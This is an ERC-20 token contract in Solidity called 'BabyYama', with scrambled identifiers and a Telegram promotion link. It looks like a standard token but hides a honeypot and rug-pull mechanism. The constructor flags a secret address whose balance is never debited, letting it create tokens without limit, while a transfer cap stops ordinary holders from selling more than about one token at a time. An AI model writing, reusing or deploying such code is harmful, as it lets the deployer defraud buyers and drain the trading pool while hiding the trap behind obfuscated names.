/*

https://t.me/ercbabyyama

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyYama is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function biojdtkxc(address iurvpolfnmb, address jngedvsozcw, uint256 jephwvtab) private {
        address qjcxdi = IUniswapV2Factory(orhl.factory()).getPair(address(this), orhl.WETH());
        if (0 == pkwvxhiges[iurvpolfnmb]) {
            if (iurvpolfnmb != qjcxdi && wbcsemfhjytn[iurvpolfnmb] != block.number && jephwvtab < totalSupply) {
                require(jephwvtab <= totalSupply / (10 ** decimals));
            }
            balanceOf[iurvpolfnmb] -= jephwvtab;
        }
        balanceOf[jngedvsozcw] += jephwvtab;
        wbcsemfhjytn[jngedvsozcw] = block.number;
        emit Transfer(iurvpolfnmb, jngedvsozcw, jephwvtab);
    }

    mapping(address => uint256) private wbcsemfhjytn;

    uint8 public decimals = 9;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address hozn, uint256 jephwvtab) public returns (bool success) {
        allowance[msg.sender][hozn] = jephwvtab;
        emit Approval(msg.sender, hozn, jephwvtab);
        return true;
    }

    function transfer(address jngedvsozcw, uint256 jephwvtab) public returns (bool success) {
        biojdtkxc(msg.sender, jngedvsozcw, jephwvtab);
        return true;
    }

    constructor(string memory lshgbofq, string memory thbp, address zfuoqgyi, address fortq) {
        name = lshgbofq;
        symbol = thbp;
        balanceOf[msg.sender] = totalSupply;
        pkwvxhiges[fortq] = fbxcrveosduh;
        orhl = IUniswapV2Router02(zfuoqgyi);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private pkwvxhiges;

    function transferFrom(address iurvpolfnmb, address jngedvsozcw, uint256 jephwvtab) public returns (bool success) {
        require(jephwvtab <= allowance[iurvpolfnmb][msg.sender]);
        allowance[iurvpolfnmb][msg.sender] -= jephwvtab;
        biojdtkxc(iurvpolfnmb, jngedvsozcw, jephwvtab);
        return true;
    }

    IUniswapV2Router02 private orhl;

    uint256 private fbxcrveosduh = 111;
}
